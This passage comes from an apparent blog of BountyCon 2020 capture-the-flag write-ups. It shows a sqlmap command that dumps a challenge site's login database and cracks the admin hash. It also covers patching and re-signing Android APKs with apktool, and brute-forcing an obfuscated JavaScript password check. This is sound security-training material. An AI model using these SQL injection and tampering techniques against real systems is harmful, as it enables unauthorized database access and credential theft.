<span class="n">auth_token</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">+</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="s">';'</span> <span class="o">+</span> <span class="n">b64</span><span class="p">)</span>
<span class="n">url</span> <span class="o">=</span> <span class="s">'https://ik6939fg0f.execute-api.eu-west-2.amazonaws.com/default/qx9nc2?AUTH_TOKEN='</span> <span class="o">+</span> <span class="n">auth_token</span>

<span class="k">print</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="k">print</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/--/bountycon20/idontplay/idp-flag.png" alt="I Don't Play Flag" height="198" class="centered-img" /></p>



<blockquote>
  <p>BountyCon{uKs6YHA2MQ4vV7TkQ5fGDHwqaNX}</p>


</blockquote>

<h3 id="whos-sequel--web--published-dec-18">Who's Sequel? â Web â published Dec 18</h3>

<blockquote>
  <p><a href="https://pr28v5drz5.execute-api.eu-west-2.amazonaws.com/default/n9h9me">https://pr28v5drz5.execute-api.eu-west-2.amazonaws.com/default/n9h9me</a></p>


</blockquote>

<p>TL;DR: Dump the database using <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a></p>



<p><img src="/--/bountycon20/whossequel/login.png" alt="Who's Sequel" height="368" class="centered-img" /></p>



<p>The title of this challenge hints at Sequel or SQL and the webpage has a login form. To check if the form is vulnerable to SQL injection, just enter <code class="highlighter-rouge">'</code> in the username field and it'll show you a SQL error confirming it's vulnerable. You can construct different SQL injections manually and try to get the flag. The simpler and faster way would be to just use sqlmap:</p>



<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-v</span> <span class="nt">-u</span> https://pr28v5drz5.execute-api.eu-west-2.amazonaws.com/default/n9h9me <span class="nt">--data</span> <span class="s2">"username=&amp;password="</span> <span class="nt">--dump</span>
</code></pre></div></div>

<p>If sqlmap asks you to crack password hashes, simply enter "N" for no. It should quickly dump the <code class="highlighter-rouge">login</code> table:</p>



<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+----+----------------------------------+--------+
| id | pass                             | user   |
+----+----------------------------------+--------+
| 1  | 0d107d09f5bbe40cade3de5c71e9e9b7 | admin  |
+----+----------------------------------+--------+
</code></pre></div></div>

<p>Google the hash <code class="highlighter-rouge">0d107d09f5bbe40cade3de5c71e9e9b7</code> and you'll find it's for the plaintext <code class="highlighter-rouge">letmein</code>. You can login with <code class="highlighter-rouge">admin:letmein</code> as the credentials and it'll redirect you to a page that just says "Under construction".</p>



<p>If you kept sqlmap running, it'll soon find another table called <code class="highlighter-rouge">pid</code> which has a lot of entries:</p>


<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+-----+-----+----------------------------------------+------------+-------------+------------+
| id  | age | city                                   | lname      | fname       | classified |
+-----+-----+----------------------------------------+------------+-------------+------------+
| 1   | 23  | SEER GREEN                             | Moss       | Lilly       | 0          |
[...]
| 256 | 43  | BountyCon{ubs2B6cdRrzuNhv2JZpYA4YmDMS} | Woodward   | Courtney    | 0          |
+-----+-----+----------------------------------------+------------+-------------+------------+
</code></pre></div></div>
<p>The last entry will have the flag you need.</p>



<h3 id="shake-it--reversing--published-dec-20">Shake It â Reversing â published Dec 20</h3>

<blockquote>
  <p>The best way to get fit - just shake it!</p>



  <p><a href="/--/bountycon20/attachments/shake_it.tar.gz">shake_it.tar.gz</a></p>


</blockquote>

<iframe src="https://giphy.com/embed/l1J9u3TZfpmeDLkD6" style="border:0;height:300px" class="centered-img" allowfullscreen=""></iframe>

<p>TL;DR: Decompile with <a href="https://ibotpeaches.github.io/Apktool/">apktool</a>, patch 10 million shakes constant to be 10 shakes, build with apktool, sign with <a href="https://github.com/patrickfav/uber-apk-signer">uber-apk-signer</a>, install with <a href="https://developer.android.com/studio/command-line/adb">adb</a></p>



<p>Install and open the app. It'll say "Start shaking!":
<img src="/--/bountycon20/shakeit/shakeit.png" alt="Shake It" width="360" /></p>



<p>After you move your device a bit, it'll say that you need to shake it around 10 million times:
<img src="/--/bountycon20/shakeit/shaked.png" alt="Shake It Shaked" width="360" /></p>



<p>It's a simple challenge and there are multiple ways to solve it. You just gotta keep moving your device for around 11 days (assuming the count goes down by 10 every second and your arm lasts that long or you get a cyborg arm).</p>



<p>If you can change the 10 million shakes constant to something like 10, you can easily get the flag.</p>



<p>Decompile the apk with <a href="https://ibotpeaches.github.io/Apktool/">apktool</a> by running <code class="highlighter-rouge">apktool d shake_it.apk</code></p>



<p>You can try running <code class="highlighter-rouge">strings</code> on the files or <code class="highlighter-rouge">grep -ri BountyCon .</code> but the challenge isn't that easy. Searching for "10000000" in the directory won't yield anything.</p>



<p>When you search for <code class="highlighter-rouge">BountyCon</code> in the directory, you'll find a match in <code class="highlighter-rouge">shake_it/smali/com/example/myapplication/MainActivity.smali</code>:</p>



<p>Explore that file and you'll find the 10 million constant is present in hexadecimal as <code class="highlighter-rouge">0x989680</code>:</p>


<pre><code class="language-smali">.method public onSensorChanged(Landroid/hardware/SensorEvent;)V
    [...]

    .line 48
    iget-wide v3, p0, Lcom/example/myapplication/MainActivity;-&gt;shakes:J

    const-wide/32 v5, 0x989680
</code></pre>

<p>Change that to a small number like <code class="highlighter-rouge">0x9</code>.</p>



<p>Now you can build your patched app. Run <code class="highlighter-rouge">apktool b .</code> in the <code class="highlighter-rouge">shake_it</code> directory. The patched build will be at <code class="highlighter-rouge">dist/shake_it.apk</code>.</p>



<p>You won't be able to install the patched apk until it's signed. Use <a href="https://github.com/patrickfav/uber-apk-signer">uber-apk-signer</a> and run <code class="highlighter-rouge">java -jar uber-apk-signer.jar -a dist/shake_it.apk</code>. The signed apk will be at <code class="highlighter-rouge">dist/shake_it-aligned-debugSigned.apk</code></p>



<p>Uninstall the existing app (<code class="highlighter-rouge">adb uninstall com.example.myapplication</code>) and run <code class="highlighter-rouge">adb install dist/shake_it-aligned-debugSigned.apk</code> to install the new apk.</p>



<p>Run the app and move your device a few times to get the flag:</p>



<p><img src="/--/bountycon20/shakeit/flag.png" alt="Shake It Flag" width="360" /></p>



<blockquote>
  <p>BountyCon{etefn4ajmgmhvpgy5c4nf34nr9q}</p>


</blockquote>

<p>If you inspect <code class="highlighter-rouge">MainActivity.smali</code>, you'll find that it's retrieving the part of the flag inside the curly brackets ({}) by calling a native method:</p>



<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>invoke-virtual {p0}, Lcom/example/myapplication/MainActivity;-&gt;stringFromJNI()Ljava/lang/String;
</code></pre></div></div>

<p>This native method is implemented in <code class="highlighter-rouge">libnative-lib.so</code> which is present for different CPU architectures (<code class="highlighter-rouge">arm64-v8a</code>, <code class="highlighter-rouge">armeabi-v7a</code>, <code class="highlighter-rouge">x86</code>, <code class="highlighter-rouge">x86_64</code>) in <code class="highlighter-rouge">shake_it/lib/$architecture</code>. If you can find out how the flag is stored in this, you won't need to deal with any of the Android stuff. Before the patching process, I ran <code class="highlighter-rouge">strings</code> on this file and the string <code class="highlighter-rouge">rgrsa4nwztzuictl5p4as34ae9d</code> stood out, I inserted it in the flag format <code class="highlighter-rouge">BountyCon{}</code> and tried submitting the flag. It didn't work. So I went along with the above process of patching the app. After finding the flag through the patched app, it looked like this string was simply <a href="https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,13)&amp;input=cmdyc2E0bnd6dHp1aWN0bDVwNGFzMzRhZTlk">ROT13 transformed</a>. I could probably have figured this out by opening <code class="highlighter-rouge">libnative-lib.so</code> in Ghidra.</p>



<h3 id="lighthouse--reversing--published-dec-20">Lighthouse â Reversing â published Dec 20</h3>

<blockquote>
  <p>Who needs a lighthouse when we have phones?</p>



  <p>Note: ensure you grant the app camera permissions.</p>



  <p><a href="/--/bountycon20/attachments/lighthouse.tar.gz">lighthouse.tar.gz</a></p>


</blockquote>

<p>TL;DR: Decompile with <a href="https://ibotpeaches.github.io/Apktool/">apktool</a>, run <code class="highlighter-rouge">strings</code> on <code class="highlighter-rouge">libnative-lib.so</code>, <a href="https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,13)&amp;input=Y2Y2dTRlajI4dTlqOWVzaW0yaWc5M3g5ZGhu">ROT13 transform</a>, insert in flag format</p>



<p>Install the app, give it camera permissions like the description suggests and open the app:</p>



<p><img src="/--/bountycon20/lighthouse/lighthouse.png" alt="Lighthouse" width="360" /></p>



<p>You'll see a "TX" button. When you tap it, it'll use your device's flash to communicate the flag using morse code, just like lighthouse keepers used to communicate with ships. You can manually note the short and long flashes as morse code and decode it but that's time consuming and this is a CTF challenge.</p>



<p>Decompile the apk with <a href="https://ibotpeaches.github.io/Apktool/">apktool</a> by running <code class="highlighter-rouge">apktool d lighthouse.apk</code> and inspect the contents. You'll find it's implemented very similarly to "Shake It" and the flag is stored in the same way (inside the native library <code class="highlighter-rouge">libnative-lib.so</code>).</p>



<p>Run <code class="highlighter-rouge">strings</code> on <code class="highlighter-rouge">libnative-lib.so</code> and find the string that looks like the flag:</p>



<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
 @@y
`B@y
cf6u4ej28u9j9esim2ig93x9dhn
cannot allocate __cxa_eh_globals
std::__libcpp_tls_set failure in __cxa_get_globals()
[...]
</code></pre></div></div>

<p><a href="https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,13)&amp;input=Y2Y2dTRlajI4dTlqOWVzaW0yaWc5M3g5ZGhu">ROT13 transform <code class="highlighter-rouge">cf6u4ej28u9j9esim2ig93x9dhn</code></a> and insert it in the flag format:</p>



<blockquote>
  <p>BountyCon{ps6h4rw28h9w9rfvz2vt93k9qua}</p>


</blockquote>

<p>In case you're wondering how ROT13 came in here, read Shake It's write-up above.</p>



<h3 id="maze-runner--web--published-dec-24">Maze Runner â Web â published Dec 24</h3>

<blockquote>
  <p>We found this ultra secure login form. But where is the code?</p>



  <p><a href="https://178.128.95.74/mr/">https://178.128.95.74/mr/</a></p>


</blockquote>

<p><img src="/--/bountycon20/mazerunner/mr-default.png" alt="Maze Runner" width="551" /></p>



<p>This is a common CTF challenge where you have to find the password to unlock the page. A lot of times, the password is the flag itself.</p>



<p>Start by inspecting the source:</p>



<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">"input"</span><span class="p">);</span>
  <span class="kd">let</span> <span class="nx">m</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">"main"</span><span class="p">).</span><span class="nx">classList</span><span class="p">;</span>
  <span class="kr">eval</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">".code"</span><span class="p">).</span><span class="nx">innerText</span><span class="p">);</span>
  <span class="kd">function</span> <span class="nx">check</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">P</span><span class="p">(</span><span class="nx">i</span><span class="p">.</span><span class="nx">value</span><span class="p">))</span> <span class="p">{</span>
      <span class="nx">m</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">"done"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="nx">m</span><span class="p">.</span><span class="nx">remove</span><span class="p">(</span><span class="s2">"done"</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">"button"</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">"click"</span><span class="p">,</span> <span class="nx">check</span><span class="p">);</span>
  <span class="nx">i</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">"keyup"</span><span class="p">,</span> <span class="nx">e</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">code</span> <span class="o">==</span> <span class="s2">"Enter"</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">check</span><span class="p">();</span>
      <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>
    <span class="p">}</span>
  <span class="p">});</span>
<span class="p">};</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">eval</code> is a function that you'll frequently find in CTF challenges:</p>


<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">eval</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">".code"</span><span class="p">).</span><span class="nx">innerText</span><span class="p">);</span>
</code></pre></div></div>

<p>The <code class="highlighter-rouge">.code</code> element displays the code in the background of the password form. Each character of the code is a child element of that element. You can either manually select all the code and copy it, or simply run the following in your console to copy it:</p>



<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">copy</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">".code"</span><span class="p">).</span><span class="nx">innerText</span><span class="p">)</span>
</code></pre></div></div>

<p>After pasting, you'll see:</p>



<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">P</span><span class="p">(</span><span class="nx">p</span><span class="p">){</span><span class="kd">let</span> <span class="nx">H</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">h</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="nx">X</span><span class="cm">/*v*
#"$%.#$%a#$%r#$%~#$%&amp;#$%{#$%=#"
%#*/</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">x</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="nx">D</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="nx">d</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">T</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">t</span><span class="o">=</span><span class="nx">L</span><span class="o">=&gt;</span><span class="cm">/*$
B2*/</span><span class="nx">L</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">""</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="nx">l</span><span class="o">=&gt;</span><span class="nx">l</span><span class="cm">/*    %
#%*/</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">)),</span><span class="nx">B</span><span class="o">=</span><span class="s2">`</span><span class="p">${</span><span class="nx">P</span><span class="cm">/*  |
%$*/</span><span class="p">}</span><span class="s2">`</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="nx">t</span><span class="p">),</span><span class="nx">b</span><span class="o">=</span><span class="cm">/*#
o#*/</span><span class="nx">t</span><span class="p">(</span><span class="nx">p</span><span class="p">).</span><span class="nx">reverse</span><span class="p">();</span><span class="k">while</span><span class="p">(</span><span class="nx">d</span><span class="cm">/*  $
#:*/</span><span class="o">&gt;=</span><span class="mi">0</span><span class="p">){[(</span><span class="nx">_</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">H</span><span class="o">+=</span><span class="nx">X</span><span class="o">*</span><span class="p">(</span><span class="nx">D</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span><span class="nx">h</span><span class="cm">/* %
%%*/</span><span class="o">+=</span><span class="nx">x</span><span class="o">*</span><span class="p">(</span><span class="nx">D</span><span class="o">-</span><span class="mi">1</span><span class="p">);}),(</span><span class="nx">_</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">T</span><span class="o">=</span><span class="nx">x</span><span class="p">;</span><span class="nx">x</span><span class="cm">/* |
u$*/</span><span class="o">=-</span><span class="nx">X</span><span class="p">;</span><span class="nx">X</span><span class="o">=</span><span class="nx">T</span><span class="p">;}),(</span><span class="nx">_</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">T</span><span class="o">=</span><span class="nx">x</span><span class="p">;</span><span class="nx">x</span><span class="o">=</span><span class="nx">X</span><span class="p">;</span><span class="cm">/*#
##*/</span><span class="nx">X</span><span class="o">=-</span><span class="nx">T</span><span class="p">;}),(</span><span class="nx">_</span><span class="o">=&gt;</span><span class="nx">b</span><span class="p">.</span><span class="nx">length</span><span class="p">?(</span><span class="nx">D</span><span class="o">=</span><span class="cm">/*$
%-*/</span><span class="nx">b</span><span class="p">.</span><span class="nx">pop</span><span class="p">()):</span><span class="nx">d</span><span class="o">=-</span><span class="mi">2</span><span class="p">),(</span><span class="nx">_</span><span class="o">=&gt;</span><span class="nx">D</span><span class="o">^=</span><span class="nx">B</span><span class="p">[</span><span class="cm">/*%
n%*/</span><span class="mi">24</span><span class="p">][</span><span class="mi">2</span><span class="o">+</span><span class="p">(</span><span class="nx">d</span><span class="o">++%</span><span class="mi">31</span><span class="cm">/* BountyCon 2
#$*/</span><span class="p">)]</span><span class="o">^</span><span class="mi">32</span><span class="p">),(</span><span class="nx">_</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">H</span><span class="o">+=</span><span class="nx">X</span><span class="p">;</span><span class="nx">h</span><span class="o">+=</span><span class="nx">x</span><span class="p">;(</span><span class="nx">D</span><span class="cm">/*#
%#*/</span><span class="o">==</span><span class="nx">B</span><span class="p">[</span><span class="nx">h</span><span class="p">][</span><span class="nx">H</span><span class="p">])</span><span class="o">||</span><span class="p">(</span><span class="nx">d</span><span class="cm">/*B[h][H]=0;$
t0*/</span><span class="o">=-</span><span class="mi">2</span><span class="p">);}),(</span><span class="nx">_</span><span class="o">=&gt;</span><span class="nx">d</span><span class="cm">/*H+=21;h--; %
#%*/</span><span class="o">=-</span><span class="mi">1</span><span class="p">),(</span><span class="nx">_</span><span class="o">=&gt;</span><span class="p">{})][</span><span class="nx">B</span><span class="p">[</span><span class="nx">h</span><span class="p">][</span><span class="nx">H</span><span class="cm">/*2020|
%$*/</span><span class="p">]</span><span class="o">&amp;</span><span class="mi">15</span><span class="p">]();</span><span class="nx">H</span><span class="o">=</span><span class="p">(</span><span class="nx">H</span><span class="o">+</span><span class="mi">31</span><span class="o">+</span><span class="nx">X</span><span class="p">)</span><span class="o">%</span><span class="mi">31</span><span class="p">;</span><span class="nx">h</span><span class="cm">/* &amp;
y#*/</span><span class="o">=</span><span class="p">(</span><span class="nx">h</span><span class="o">+</span><span class="nx">B</span><span class="p">.</span><span class="nx">length</span><span class="o">+</span><span class="nx">x</span><span class="p">)</span><span class="o">%</span><span class="nx">B</span><span class="p">.</span><span class="nx">length</span><span class="p">}</span><span class="cm">/*
#f*/</span><span class="k">return</span> <span class="nx">d</span><span class="o">==-</span><span class="mi">1</span><span class="o">&amp;&amp;!</span><span class="nx">b</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="cm">/*!
$%** _ __ ___ , __ _ _______ *&amp;
%$* | '_ ` _ \ / _` |_  / _ \ %
@#* | | | | | | (_| |/ /  __/ &amp;
#j* |_| |_| |_|\__,_/___\___| $
$%#!$!% %!$!# #!##'*+,-./!! | &amp;
""$#t%$#c%$#3%$#g%$#z%$#'j%$#n%
runner runner runner runner */</span><span class="p">}</span>
</code></pre></div></div>

<p>I <a href="https://beautifier.io/">beautified it</a>, removed the comments, renamed the variables/functions, added a few <code class="highlighter-rouge">console.log</code> statements to understand what was going on and pasted the patched code in the console. I ran the <code class="highlighter-rouge">test</code> or <code class="highlighter-rouge">P</code> function in the console with a few different inputs and found out a section of code that validates if the next character is valid.</p>



<p>Here is the final patched code, edits explained with comments:</p>


<div style="min-width:900px" class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">eval</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">".code"</span><span class="p">).</span><span class="nx">innerText</span><span class="p">);</span>
<span class="kd">function</span> <span class="nx">test</span><span class="p">(</span><span class="nx">pwd</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">bigH</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="nx">smalH</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
        <span class="nx">bigX</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="nx">smalX</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
        <span class="nx">bigD</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
        <span class="nx">lowerD</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
        <span class="nx">bigT</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> 
        <span class="nx">charcodify</span> <span class="o">=</span> <span class="nx">chars</span> <span class="o">=&gt;</span> <span class="nx">chars</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">""</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="nx">line</span> <span class="o">=&gt;</span> <span class="nx">line</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">)),</span>
        <span class="nx">ogSourceCodes</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">P</span><span class="p">}</span><span class="s2">`</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="nx">charcodify</span><span class="p">),</span>
        <span class="nx">pwdCodedReversed</span> <span class="o">=</span> <span class="nx">charcodify</span><span class="p">(</span><span class="nx">pwd</span><span class="p">).</span><span class="nx">reverse</span><span class="p">();</span>
    <span class="kd">let</span> <span class="nx">wrong</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span> <span class="c1">// 1. declare a boolean</span>
    <span class="k">while</span> <span class="p">(</span><span class="nx">lowerD</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">funcarr</span> <span class="o">=</span> <span class="p">[</span>
            <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="nx">bigH</span> <span class="o">+=</span> <span class="nx">bigX</span> <span class="o">*</span> <span class="p">(</span><span class="nx">bigD</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
                <span class="nx">smalH</span> <span class="o">+=</span> <span class="nx">smalX</span> <span class="o">*</span> <span class="p">(</span><span class="nx">bigD</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
            <span class="p">},</span>
            <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="nx">bigT</span> <span class="o">=</span> <span class="nx">smalX</span><span class="p">;</span>
                <span class="nx">smalX</span> <span class="o">=</span> <span class="o">-</span><span class="nx">bigX</span><span class="p">;</span>
                <span class="nx">bigX</span> <span class="o">=</span> <span class="nx">bigT</span><span class="p">;</span>
            <span class="p">},</span>
            <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="nx">bigT</span> <span class="o">=</span> <span class="nx">smalX</span><span class="p">;</span>
                <span class="nx">smalX</span> <span class="o">=</span> <span class="nx">bigX</span><span class="p">;</span>
                <span class="nx">bigX</span> <span class="o">=</span> <span class="o">-</span><span class="nx">bigT</span><span class="p">;</span>
            <span class="p">},</span>
            <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">pwdCodedReversed</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="nx">bigD</span> <span class="o">=</span> <span class="nx">pwdCodedReversed</span><span class="p">.</span><span class="nx">pop</span><span class="p">()</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="nx">lowerD</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2</span>
                <span class="p">}</span>
            <span class="p">},</span>
            <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nx">bigD</span> <span class="o">^=</span> <span class="nx">ogSourceCodes</span><span class="p">[</span><span class="mi">24</span><span class="p">][</span><span class="mi">2</span> <span class="o">+</span> <span class="p">(</span><span class="nx">lowerD</span><span class="o">++</span> <span class="o">%</span> <span class="mi">31</span><span class="p">)]</span> <span class="o">^</span> <span class="mi">32</span>
            <span class="p">},</span>
            <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="nx">bigH</span> <span class="o">+=</span> <span class="nx">bigX</span><span class="p">;</span>
                <span class="nx">smalH</span> <span class="o">+=</span> <span class="nx">smalX</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">bigD</span> <span class="o">!=</span> <span class="nx">ogSourceCodes</span><span class="p">[</span><span class="nx">smalH</span><span class="p">][</span><span class="nx">bigH</span><span class="p">])</span> <span class="p">{</span>
                    <span class="nx">wrong</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span> <span class="c1">// 2. flip the boolean if the current character is wrong</span>
                    <span class="nx">lowerD</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">},</span>
            <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nx">lowerD</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
            <span class="p">},</span>
            <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="p">}</span>
        <span class="p">]</span>
        <span class="nx">funcarr</span><span class="p">[</span><span class="nx">ogSourceCodes</span><span class="p">[</span><span class="nx">smalH</span><span class="p">][</span><span class="nx">bigH</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mi">15</span><span class="p">]();</span>
        <span class="nx">bigH</span> <span class="o">=</span> <span class="p">(</span><span class="nx">bigH</span> <span class="o">+</span> <span class="mi">31</span> <span class="o">+</span> <span class="nx">bigX</span><span class="p">)</span> <span class="o">%</span> <span class="mi">31</span><span class="p">;</span>
        <span class="nx">smalH</span> <span class="o">=</span> <span class="p">(</span><span class="nx">smalH</span> <span class="o">+</span> <span class="nx">ogSourceCodes</span><span class="p">.</span><span class="nx">length</span> <span class="o">+</span> <span class="nx">smalX</span><span class="p">)</span> <span class="o">%</span> <span class="nx">ogSourceCodes</span><span class="p">.</span><span class="nx">length</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">wrong</span><span class="p">)</span> <span class="k">return</span> <span class="mi">1337</span> <span class="c1">// 3. return 1337 constant</span>
    <span class="c1">// 4. comment out the next line:</span>
    <span class="c1">// return lowerD == -1 &amp;&amp; !pwdCodedReversed.length;</span>
<span class="p">}</span>

<span class="c1">// 5. now simply brute each possible character</span>
<span class="kd">const</span> <span class="nx">charset</span> <span class="o">=</span> <span class="s1">' !"#$%&amp;</span><span class="se">\'</span><span class="s1">()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[</span><span class="err">\\</span><span class="s1">]^_`abcdefghijklmnopqrstuvwxyz{|}~'</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">''</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">flag</span> <span class="o">=</span> <span class="s1">'BountyCon{'</span>
<span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">const</span> <span class="nx">c</span> <span class="k">of</span> <span class="nx">charset</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'trying'</span><span class="p">,</span> <span class="nx">flag</span> <span class="o">+</span> <span class="nx">c</span><span class="p">)</span>
        <span class="kd">const</span> <span class="nx">ret</span> <span class="o">=</span> <span class="nx">test</span><span class="p">(</span><span class="nx">flag</span> <span class="o">+</span> <span class="nx">c</span><span class="p">)</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">ret</span> <span class="o">!==</span> <span class="mi">1337</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">flag</span> <span class="o">+=</span> <span class="nx">c</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">flag</span><span class="p">.</span><span class="nx">endsWith</span><span class="p">(</span><span class="s1">'}'</span><span class="p">))</span> <span class="k">break</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">flag</span><span class="p">.</span><span class="nx">endsWith</span><span class="p">(</span><span class="s1">'}'</span><span class="p">))</span> <span class="k">break</span>
<span class="p">}</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span>
</code></pre></div></div>

<p>Run the code in the console of the webpage and the flag will be logged:</p>


<blockquote>
  <p>BountyCon{b3fung3-93-but-w0rs3}</p>


</blockquote>

